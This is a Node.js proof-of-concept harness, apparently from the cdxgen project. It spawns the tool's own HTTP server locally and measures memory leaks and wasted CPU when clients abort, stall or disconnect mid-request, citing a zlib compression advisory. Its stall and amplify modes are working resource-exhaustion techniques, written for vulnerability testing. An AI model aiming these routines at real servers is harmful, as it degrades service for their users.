#!/usr/bin/env node
/**
 * Memory and CPU behaviour of aborted requests against the cdxgen HTTP server.
 *
 * Drives the real server (bin/cdxgen.js --server) with sequential requests for
 * a large BOM, disconnecting clients at various points, and measures what that
 * costs the server. Originally written to test GHSA-vc2v-76pw-4v95 /
 * CVE-2026-87776 (compression < 1.8.2 leaks the native zlib stream when a
 * client aborts a compressed response mid-flight).
 *
 * External RSS on its own cannot tell retained memory from V8 arena pages that
 * were simply never returned to the OS, so pass --probe-port to preload
 * server-mem-probe.mjs into the server child. The harness can then force a full
 * GC and read process.memoryUsage() and v8.getHeapStatistics() from inside the
 * process. Judge leaks by post-GC heapUsed/external/arrayBuffers/malloced,
 * never by RSS alone. Without --probe-port the leak verdict is reported as
 * inconclusive, because RSS cannot tell retained memory from arena pages.
 *
 * Give the run enough requests, too: RSS only plateaus after ~300 (see
 * RAMP_REQUESTS), and a shorter run charges V8's one-off warmup to the requests
 * and appears to show a steady per-request leak that is not there.
 *
 * Modes:
 *   node contrib/server-abort-poc.mjs                 — abort-after-first-chunk leak test
 *   node contrib/server-abort-poc.mjs --mode stall    — clients stop reading but hold the
 *                                                       socket open; measures how much
 *                                                       server memory each stalled
 *                                                       compressed response pins
 *   node contrib/server-abort-poc.mjs --mode amplify  — abort mid-generation and measure
 *                                                       the server CPU still burned on
 *                                                       BOM generation nobody will read,
 *                                                       relative to a full generation
 *
 * Useful flags: --requests N (default 250), --port N (default 19321),
 * --fixture PATH (default test/data/package-json/theia),
 * --encoding gzip|br|deflate, --sample-every N, --settle-ms N, --no-abort
 * (control: read every response fully), --keep-server.
 *
 * --stop-delay-ms N makes the client stop reading after the first chunk and
 * wait N ms before destroying the socket, so the server is blocked mid-write
 * inside the compression stream when the disconnect lands. A plain abort races
 * the response to completion on loopback and never reaches that window. In
 * --mode amplify it is instead how long the server is left generating before
 * the client vanishes (default 300).
 *
 * Profiling flags:
 *   --probe-port N   open the in-process probe on this port (enables the
 *                    post-GC heap breakdown; strongly recommended)
 *   --probe-module P override the preloaded probe (default: server-mem-probe.mjs
 *                    next to this file)
 *   --probe-dir D    also write .heapsnapshot files there. Taking a snapshot
 *                    costs the server process a few hundred MB of RSS by
 *                    itself, so never combine this with a run whose RSS numbers
 *                    you intend to trust — snapshot in a separate run.
 *
 * Example — is per-request growth unbounded or a plateau?
 *   node contrib/server-abort-poc.mjs --requests 500 --no-abort --port 19340 \
 *     --sample-every 50 --settle-ms 20000 --probe-port 19540
 */
import { spawn, spawnSync } from "node:child_process";
import http from "node:http";
import path from "node:path";
import process from "node:process";
import { fileURLToPath, pathToFileURL } from "node:url";

const repoRoot = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "..",
);

function parseArgs(argv) {
  const args = {
    mode: "leak",
    requests: 250,
    port: 19321,
    host: "127.0.0.1",
    fixture: path.join(repoRoot, "test", "data", "package-json", "theia"),
    encoding: "gzip",
    keepServer: false,
    sampleEvery: 25,
    settleMs: 45000,
    noAbort: false,
    stopDelayMs: 0,
    probePort: 0,
    probeModule: path.join(
      path.dirname(fileURLToPath(import.meta.url)),
      "server-mem-probe.mjs",
    ),
    probeDir: "",
  };
  for (let i = 2; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--mode") args.mode = argv[++i];
    else if (a === "--requests") args.requests = Number(argv[++i]);
    else if (a === "--port") args.port = Number(argv[++i]);
    else if (a === "--host") args.host = argv[++i];
    else if (a === "--fixture") args.fixture = path.resolve(argv[++i]);
    else if (a === "--encoding") args.encoding = argv[++i];
    else if (a === "--keep-server") args.keepServer = true;
    else if (a === "--sample-every") args.sampleEvery = Number(argv[++i]);
    else if (a === "--settle-ms") args.settleMs = Number(argv[++i]);
    else if (a === "--no-abort") args.noAbort = true;
    else if (a === "--stop-delay-ms") args.stopDelayMs = Number(argv[++i]);
    else if (a === "--probe-port") args.probePort = Number(argv[++i]);
    else if (a === "--probe-module") args.probeModule = path.resolve(argv[++i]);
    else if (a === "--probe-dir") args.probeDir = path.resolve(argv[++i]);
    else throw new Error(`Unknown argument: ${a}`);
  }
  return args;
}

const args = parseArgs(process.argv);

/**
 * Requests needed before server RSS stops climbing and plateaus. Measured on
 * the theia fixture, where RSS flattened at ~322 MB from request 300 onward.
 * Below this, per-request RSS figures are warmup, not growth.
 */
const RAMP_REQUESTS = 300;

function waitFor(condition, timeoutMs, everyMs = 100) {
  const start = Date.now();
  return new Promise((resolve, reject) => {
    const tick = () => {
      const v = condition();
      if (v) return resolve(v);
      if (Date.now() - start > timeoutMs) {
        return reject(new Error("timeout"));
      }
      setTimeout(tick, everyMs);
    };
    tick();
  });
}

async function startCdxgenServer() {
  // When a probe module is supplied it is preloaded into the server child so
  // the harness can read process.memoryUsage()/v8 heap statistics and take
  // heap snapshots from inside the process, instead of inferring everything
  // from external RSS.
  const nodeArgs = args.probePort
    ? ["--expose-gc", "--import", pathToFileURL(args.probeModule).href]
    : [];
  const child = spawn(
    process.execPath,
    [
      ...nodeArgs,
      path.join(repoRoot, "bin", "cdxgen.js"),
      "--server",
      "--server-host",
      args.host,
      "--server-port",
      String(args.port),
      "--no-install-deps",
    ],
    {
      cwd: repoRoot,
      stdio: ["ignore", "pipe", "pipe"],
      env: {
        ...process.env,
        CDXGEN_PROBE_PORT: String(args.probePort || ""),
        CDXGEN_PROBE_DIR: args.probeDir || "",
      },
    },
  );
  child.stdout.setEncoding("utf8");
  let out = "";
  child.stdout.on("data", (d) => {
    out += d;
  });
  child.stderr.on("data", (d) => {
    out += d;
  });
  await waitFor(() => /Listening on/.test(out), 120000, 200).catch(() => {
    console.error(
      "Server did not report readiness. Output so far:\n" + out.slice(-2000),
    );
    child.kill("SIGKILL");
    process.exit(2);
  });
  return { child };
}

// --- platform-tolerant process metrics ---

function serverRssKb(pid) {
  if (process.platform !== "win32") {
    try {
      const r = spawnSync("ps", ["-o", "rss=", "-p", String(pid)]);
      const v = Number.parseInt(r.stdout.toString().trim(), 10);
      if (Number.isFinite(v) && v > 0) return v;
    } catch {
      // fall through
    }
  }
  return undefined;
}

function serverCpuSeconds(pid) {
  if (process.platform !== "win32") {
    try {
      const r = spawnSync("ps", ["-o", "time=", "-p", String(pid)]);
      const m = r.stdout.toString().trim().match(/^(\d+):(\d+)\.(\d+)$/);
      if (m) {
        return Number(m[1]) * 60 + Number(m[2]) + Number(`0.${m[3]}`);
      }
    } catch {
      // fall through
    }
  }
  return undefined;
}

// --- HTTP helpers ---

const sbomUrl = `http://${args.host}:${args.port}/sbom?type=javascript&installDeps=false&multiProject=false&path=${encodeURIComponent(args.fixture)}`;

/**
 * Issues one GET /sbom request.
 *
 * @param {number|undefined|"immediate"} abortOn undefined = read fully;
 *   number = destroy the socket after that many data chunks; "immediate" =
 *   destroy as soon as the connection is established, before any response.
 */
function get(abortOn) {
  return new Promise((resolve) => {
    const req = http.get(
      sbomUrl,
      { headers: { "Accept-Encoding": args.encoding } },
      (res) => {
        let chunks = 0;
        let bytes = 0;
        res.on("data", (c) => {
          bytes += c.length;
          chunks++;
          if (abortOn === chunks) {
            const kill = () => {
              res.destroy();
              res.socket?.destroy();
              resolve({
                aborted: true,
                status: res.statusCode,
                headers: res.headers,
                bytes,
              });
            };
            if (args.stopDelayMs > 0) {
              // Hardstop: stop reading but keep the socket open. The kernel
              // and socket buffers fill, the server blocks mid-write inside
              // the compression stream, and only then do we destroy the
              // connection — which is the window GHSA-vc2v-76pw-4v95 is about.
              res.pause();
              setTimeout(kill, args.stopDelayMs);
            } else {
              kill();
            }
          }
        });
        res.on("end", () =>
          resolve({
            aborted: false,
            status: res.statusCode,
            headers: res.headers,
            bytes,
          }),
        );
        res.on("error", () =>
          resolve({
            aborted: true,
            status: res.statusCode,
            headers: res.headers,
            bytes,
          }),
        );
      },
    );
    req.on("error", () => resolve({ aborted: true, error: true }));
    if (abortOn === "immediate") {
      req.on("socket", (socket) => {
        socket.once("connect", () => {
          req.destroy();
          resolve({ aborted: true, immediate: true });
        });
      });
    }
  });
}

const mb = (v) => (v === undefined ? "n/a" : (v / 1024).toFixed(1));
const mbB = (v) => (v === undefined ? "n/a" : (v / 1024 / 1024).toFixed(1));

/**
 * Calls the in-process probe preloaded into the server child.
 *
 * @param {string} route "mem", "gc" or "snapshot?tag=..."
 * @returns {Promise<object|undefined>} probe payload, or undefined if no probe
 */
function probe(route) {
  if (!args.probePort) return Promise.resolve(undefined);
  return new Promise((resolve) => {
    const req = http.get(
      `http://127.0.0.1:${args.probePort}/${route}`,
      (res) => {
        let body = "";
        res.setEncoding("utf8");
        res.on("data", (d) => {
          body += d;
        });
        res.on("end", () => {
          try {
            resolve(JSON.parse(body));
          } catch {
            resolve(undefined);
          }
        });
      },
    );
    req.on("error", () => resolve(undefined));
    req.setTimeout(120000, () => {
      req.destroy();
      resolve(undefined);
    });
  });
}

/** One-line breakdown of where the server's memory currently sits. */
function describeMem(m) {
  if (!m) return "probe unavailable";
  return [
    `rss=${mbB(m.rss)}`,
    `heapUsed=${mbB(m.heapUsed)}`,
    `heapTotal=${mbB(m.heapTotal)}`,
    `external=${mbB(m.external)}`,
    `arrayBuffers=${mbB(m.arrayBuffers)}`,
    `mallocedNative=${mbB(m.heap?.malloced_memory)}`,
  ].join(" ");
}

async function runLeakMode(pid) {
  // Warmup: one full request to JIT-warm the BOM generation path and to prove
  // the response is compressed and large enough to abort mid-flight.
  const warm = await get(undefined);
  const enc = warm.headers?.["content-encoding"];
  console.log(
    `warmup: status=${warm.status} content-encoding=${enc} compressedBytes=${warm.bytes}`,
  );
  if (enc !== args.encoding) {
    console.error(
      `FAIL: response was not ${args.encoding} encoded (got ${enc})`,
    );
    process.exitCode = 3;
    return;
  }
  if (warm.bytes < 50 * 1024) {
    console.error(
      `FAIL: compressed response too small (${warm.bytes} bytes) to abort mid-stream`,
    );
    process.exitCode = 3;
    return;
  }

  const rss0 = serverRssKb(pid);
  const mem0 = await probe("gc");
  console.log(`start RSS: ${mb(rss0)} MB`);
  console.log(`start mem (post-GC): ${describeMem(mem0)}`);
  if (args.probePort && args.probeDir) {
    await probe(`snapshot?tag=baseline`);
  }

  let aborted = 0;
  let completed = 0;
  for (let i = 1; i <= args.requests; i++) {
    const r = await get(args.noAbort ? undefined : 1);
    if (r.aborted) aborted++;
    else completed++;
    if (i % args.sampleEvery === 0) {
      const rss = serverRssKb(pid);
      const m = await probe("mem");
      console.log(
        `after ${String(i).padStart(4)} requests: RSS ${mb(rss)} MB (aborted=${aborted} completed=${completed}) ${describeMem(m)}`,
      );
    }
    await new Promise((r2) => setTimeout(r2, 10));
  }
  // Idle-settle phase: let the V8 heap collect the per-request BOM garbage so
  // JS churn is separated from leaked native zlib memory. Garbage-driven RSS
  // decays back toward the baseline once major GCs run; a native zlib leak
  // never does. Sample the decay curve.
  console.log(`\nsettling for ${args.settleMs / 1000}s to let GC reclaim JS heap garbage...`);
  const settleStart = Date.now();
  while (Date.now() - settleStart < args.settleMs) {
    await new Promise((r) => setTimeout(r, 5000));
    console.log(
      `  settle t+${((Date.now() - settleStart) / 1000).toFixed(0).padStart(3)}s: RSS ${mb(serverRssKb(pid))} MB`,
    );
  }
  // Forced full GC after the settle: whatever survives this is genuinely
  // retained rather than uncollected garbage.
  const memEnd = await probe("gc");
  if (args.probePort && args.probeDir) {
    await probe(`snapshot?tag=final`);
  }
  const rssEnd = serverRssKb(pid);
  const growth = rssEnd - rss0;
  // growth is in KB (ps reports RSS in KB), so this is already KB per abort.
  const perAbort = aborted ? growth / aborted : 0;
  const n = aborted + completed;
  console.log("\n==== leak summary ====");
  if (mem0 && memEnd) {
    console.log(`mem before (post-GC): ${describeMem(mem0)}`);
    console.log(`mem after  (post-GC): ${describeMem(memEnd)}`);
    const d = (k, get) => {
      const delta = get(memEnd) - get(mem0);
      console.log(
        `  ${k.padEnd(14)} ${(delta / 1024 / 1024).toFixed(1)} MB total, ${(delta / n / 1024).toFixed(1)} KB/request`,
      );
    };
    d("rss", (m) => m.rss);
    d("heapUsed", (m) => m.heapUsed);
    d("heapTotal", (m) => m.heapTotal);
    d("external", (m) => m.external);
    d("arrayBuffers", (m) => m.arrayBuffers);
    d("mallocedNative", (m) => m.heap.malloced_memory);
  }
  console.log(
    `requests          : ${n} (aborted=${aborted} completed=${completed}${args.noAbort ? " — control run, none aborted" : ""})`,
  );
  console.log(
    `RSS peak-to-settled growth: ${mb(Math.abs(growth))} MB ${growth < 0 ? "(shrunk)" : ""}`,
  );
  console.log(`settled growth per abort : ~${perAbort.toFixed(0)} KB`);

  // RSS climbs steeply while the server warms up and only flattens once V8 has
  // grown its arenas to the working set — measured at around 300 requests for
  // the theia fixture. Dividing total RSS growth by a request count below that
  // charges the whole one-off ramp to the requests and reports a per-request
  // leak that does not exist.
  if (n < RAMP_REQUESTS) {
    console.log(
      `\nCAUTION: ${n} requests is below the ~${RAMP_REQUESTS} needed for RSS to plateau,\n` +
        "  so the per-request RSS figures above are dominated by V8 arena warmup\n" +
        "  and overstate real growth. Re-run with more requests before believing them.",
    );
  }

  // RSS counts arena pages V8 has decommitted but not returned to the OS, so it
  // keeps growing long after the last retained object is gone. Only the post-GC
  // heap statistics distinguish a leak from that; fall back to RSS just to say
  // the run was inconclusive.
  if (mem0 && memEnd) {
    const retained =
      memEnd.heapUsed -
      mem0.heapUsed +
      (memEnd.external - mem0.external) +
      (memEnd.heap.malloced_memory - mem0.heap.malloced_memory);
    console.log(
      `retained after forced GC (heapUsed+external+malloced): ${(retained / 1024 / 1024).toFixed(1)} MB, ${(retained / n / 1024).toFixed(1)} KB/request`,
    );
    console.log(
      retained > 10 * 1024 * 1024
        ? "VERDICT: LEAK — memory survived a forced full GC (cf. GHSA-vc2v-76pw-4v95)"
        : "VERDICT: no retained growth — nothing survived a forced full GC (RSS growth is unreturned V8 arena pages)",
    );
  } else {
    console.log(
      "VERDICT: INCONCLUSIVE — no probe, so only RSS was observed and RSS cannot\n" +
        "  separate retained memory from unreturned arena pages. Re-run with --probe-port.",
    );
  }
}

/**
 * Issues one GET /sbom request and stalls: reads the first data chunk, then
 * pauses and holds the socket open without reading further. The server keeps
 * the connection (and the queued compressed response) alive until the client
 * gives up or the server times the socket out. Resolves with the held
 * response object so the caller can release it later.
 */
function stallAndHold() {
  return new Promise((resolve, reject) => {
    const req = http.get(
      sbomUrl,
      { headers: { "Accept-Encoding": args.encoding } },
      (res) => {
        res.once("data", () => {
          res.pause();
          resolve({ res, status: res.statusCode });
        });
      },
    );
    req.on("error", reject);
  });
}

async function runStallMode(pid) {
  const warm = await get(undefined);
  console.log(
    `warmup: status=${warm.status} content-encoding=${warm.headers?.["content-encoding"]} compressedBytes=${warm.bytes}`,
  );
  const rss0 = serverRssKb(pid);
  console.log(`start RSS: ${mb(rss0)} MB, opening ${args.requests} stalled connections...`);

  const held = [];
  let failed = 0;
  for (let i = 1; i <= args.requests; i++) {
    try {
      const { res } = await stallAndHold();
      held.push(res);
    } catch {
      failed++;
    }
    if (i % args.sampleEvery === 0) {
      const rss = serverRssKb(pid);
      console.log(
        `${String(i).padStart(4)} stalled connections held: RSS ${mb(rss)} MB (failed=${failed})`,
      );
    }
  }
  // Give the server a moment to finish generating and queue everything.
  await new Promise((r) => setTimeout(r, 10000));
  const rssHeld = serverRssKb(pid);
  const heldGrowth = rssHeld - rss0;
  console.log(`\nwhile holding ${held.length} stalled connections:`);
  console.log(`RSS growth: ${mb(Math.abs(heldGrowth))} MB (~${((heldGrowth / Math.max(held.length, 1)) * 1024).toFixed(0)} KB per stalled connection)`);

  // Release: destroy every held client socket and watch the server recover.
  console.log(`\nreleasing all ${held.length} connections...`);
  for (const res of held) {
    res.destroy();
  }
  const t0 = Date.now();
  while (Date.now() - t0 < args.settleMs) {
    await new Promise((r) => setTimeout(r, 5000));
    console.log(
      `  release t+${((Date.now() - t0) / 1000).toFixed(0).padStart(3)}s: RSS ${mb(serverRssKb(pid))} MB`,
    );
  }
  const rssEnd = serverRssKb(pid);
  const finalGrowth = rssEnd - rss0;
  console.log("\n==== stall summary ====");
  console.log(`stalled connections : ${held.length} (+${failed} failed)`);
  console.log(`pinned while held   : ${mb(Math.abs(heldGrowth))} MB (~${((heldGrowth / Math.max(held.length, 1)) * 1024).toFixed(0)} KB/conn)`);
  console.log(
    `still retained after release + ${args.settleMs / 1000}s settle: ${mb(Math.abs(finalGrowth))} MB`,
  );
  console.log(
    finalGrowth > 50 * 1024
      ? "VERDICT: memory remained retained after clients released (cleanup incomplete or leak)"
      : "VERDICT: server released the pinned memory after clients disconnected",
  );
}

/**
 * Issues a GET /sbom, lets the server receive it and start generating, then
 * destroys the connection while generation is still in flight. Resolves as
 * soon as the socket is destroyed, not when the server gives up.
 *
 * @param {number} afterMs how long to let the server work before disconnecting
 */
function abortInFlight(afterMs) {
  return new Promise((resolve) => {
    const req = http.get(sbomUrl, {
      headers: { "Accept-Encoding": args.encoding },
    });
    let settled = false;
    const done = () => {
      if (settled) return;
      settled = true;
      resolve({ aborted: true });
    };
    req.on("error", done);
    // The response does not arrive until the BOM is fully generated, so a
    // timer started once the request is on the wire lands mid-generation.
    // Loopback connect time is negligible next to afterMs, so the timer starts
    // as soon as the socket is assigned rather than on "connect" — which never
    // fires for a socket that is already connected.
    req.on("socket", (socket) => {
      setTimeout(() => {
        req.destroy();
        socket.destroy();
        done();
      }, afterMs);
    });
  });
}

async function runAmplifyMode(pid) {
  // Baseline: what one full, uninterrupted generation costs in server CPU.
  await get(undefined);
  const base0 = serverCpuSeconds(pid);
  const baseN = Math.max(5, Math.round(args.requests / 10));
  for (let i = 0; i < baseN; i++) {
    await get(undefined);
  }
  const base1 = serverCpuSeconds(pid);
  const perFullMs = ((base1 - base0) * 1000) / baseN;
  console.log(
    `baseline: ${baseN} completed requests cost ${((base1 - base0) * 1000).toFixed(0)} ms server CPU (~${perFullMs.toFixed(1)} ms/request)`,
  );

  const delay = args.stopDelayMs > 0 ? args.stopDelayMs : 300;
  const cpu0 = serverCpuSeconds(pid);
  console.log(
    `start server CPU: ${cpu0?.toFixed(2)}s; aborting each request ${delay} ms after it reaches the server`,
  );
  let done = 0;
  for (let i = 0; i < args.requests; i++) {
    await abortInFlight(delay);
    done++;
  }
  // Wait for the server to go quiet: poll CPU until it stops advancing.
  let last = serverCpuSeconds(pid);
  let stable = 0;
  const t0 = Date.now();
  while (Date.now() - t0 < 120000 && stable < 6) {
    await new Promise((r) => setTimeout(r, 1000));
    const now = serverCpuSeconds(pid);
    if (now === last) stable++;
    else stable = 0;
    last = now;
  }
  const cpu1 = serverCpuSeconds(pid);
  console.log(
    `aborted ${done} in-flight requests; server CPU burned: ${((cpu1 - cpu0) * 1000).toFixed(0)} ms`,
  );
  const perAbortMs = ((cpu1 - cpu0) * 1000) / done;
  console.log(
    `wasted CPU per aborted request: ~${perAbortMs.toFixed(1)} ms (a full generation costs ~${perFullMs.toFixed(1)} ms)`,
  );
  const ratio = perAbortMs / perFullMs;
  console.log(`amplification: ${(ratio * 100).toFixed(0)}% of a full generation`);
  console.log(
    ratio > 0.5
      ? "VERDICT: server keeps generating BOMs for clients that already left (no request-close cancellation in the /sbom handler)"
      : "VERDICT: aborted requests cost well under a full generation — work is cut short somewhere",
  );
}

async function main() {
  console.log(
    `PoC mode=${args.mode} encoding=${args.encoding} requests=${args.requests}`,
  );
  console.log(`fixture=${args.fixture}`);
  const { child } = await startCdxgenServer();
  try {
    if (args.mode === "leak") {
      await runLeakMode(child.pid);
    } else if (args.mode === "stall") {
      await runStallMode(child.pid);
    } else if (args.mode === "amplify") {
      await runAmplifyMode(child.pid);
    } else {
      throw new Error(`unknown mode ${args.mode}`);
    }
  } finally {
    if (args.keepServer) {
      console.log(`keeping server alive, pid=${child.pid}`);
    } else {
      child.kill("SIGTERM");
    }
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
